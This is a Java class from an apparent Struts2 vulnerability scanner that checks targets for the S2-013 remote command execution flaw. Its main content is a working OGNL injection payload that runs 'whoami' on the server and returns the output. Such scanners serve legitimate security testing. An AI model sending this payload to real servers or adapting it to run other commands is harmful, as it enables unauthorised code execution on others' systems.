package com.mtx.xiatian.hacker.struts2Scan;

/**
 * http://struts.apache.org/docs/s2-013.html
 * 远程命令执行漏洞
 * @author xiatian，fucong
 *
 */
public class S2_013 extends CheckTools implements IStruts2Scan {

	private static String s2_013_POC= "a=1${%23_memberAccess[\"allowStaticMethodAccess\"]=true,+%23a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close()}";

	@Override
	public boolean doS2LeakScan(String target) {
		return doS2LeakScan(target, s2_013_POC);
	}
}
